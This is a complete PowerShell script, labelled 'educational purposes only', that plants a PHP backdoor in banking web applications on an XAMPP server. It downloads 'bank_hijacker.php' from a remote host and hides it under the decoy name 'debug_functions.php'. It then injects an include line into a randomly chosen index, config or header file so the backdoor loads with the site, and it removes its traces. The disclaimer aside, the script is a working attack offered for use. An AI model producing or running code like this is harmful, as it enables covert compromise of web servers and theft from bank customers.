# PowerShell script to deploy PHP backdoor - EDUCATIONAL PURPOSES ONLY

# Configuration
$backdoorUrl = "http://192.168.20.200:8000/bank_hijacker.php"
$targetPaths = @(
    "C:\xampp\htdocs",
    "C:\xampp\htdocs\bank_app",
    "C:\xampp\htdocs\bank_app\includes",
    "C:\xampp\htdocs\bank"
)

function Deploy-Backdoor {
    # Download the backdoor
    $tempFile = "$env:TEMP\temp_file.php"
    Invoke-WebRequest -Uri $backdoorUrl -OutFile $tempFile
    
    # Find potential PHP files to inject into
    $targetFiles = @()
    
    foreach ($path in $targetPaths) {
        if (Test-Path $path) {
            # Look for common PHP files
            $files = Get-ChildItem -Path $path -Filter "*.php" -Recurse |
                     Where-Object { $_.Name -match "index\.php|config\.php|functions\.php|common\.php|header\.php" }
            
            $targetFiles += $files
        }
    }
    
    if ($targetFiles.Count -eq 0) {
        Write-Host "No suitable target files found. Placing backdoor directly."
        
        # Just place the backdoor in the web root
        if (Test-Path "C:\xampp\htdocs") {
            Copy-Item $tempFile "C:\xampp\htdocs\bank_hijacker.php"
            Write-Host "Backdoor placed at C:\xampp\htdocs\bank_hijacker.php"
            
            # Create include in index.php if it exists
            if (Test-Path "C:\xampp\htdocs\index.php") {
                $content = Get-Content "C:\xampp\htdocs\index.php"
                $newContent = "<?php include 'bank_hijacker.php'; ?>`n" + $content
                Set-Content "C:\xampp\htdocs\index.php" $newContent
                Write-Host "Modified C:\xampp\htdocs\index.php to include backdoor"
            }
        }
    }
    else {
        # Choose a random file to inject into
        $targetFile = $targetFiles | Get-Random
        Write-Host "Selected target: $($targetFile.FullName)"
        
        # Read existing content
        $content = Get-Content $targetFile.FullName -Raw
        
        # Create the include statement
        $backdoorPath = Join-Path $targetFile.Directory.FullName "debug_functions.php"
        
        # Copy the backdoor with a misleading name
        Copy-Item $tempFile $backdoorPath
        Write-Host "Backdoor placed at $backdoorPath"
        
        # Inject include into the target file
        $includeStatement = "<?php include 'debug_functions.php'; ?>"
        
        if ($content -match "^<\?php") {
            # Replace the opening PHP tag to include our backdoor
            $newContent = $content -replace "^<\?php", "<?php`ninclude 'debug_functions.php';"
            Set-Content $targetFile.FullName $newContent
        }
        else {
            # Prepend our include
            $newContent = $includeStatement + "`n" + $content
            Set-Content $targetFile.FullName $newContent
        }
        
        Write-Host "Modified $($targetFile.FullName) to include backdoor"
    }
    
    # Clean up
    Remove-Item $tempFile -Force
    Write-Host "Deployment complete"
}

# Execute the deployment
Deploy-Backdoor
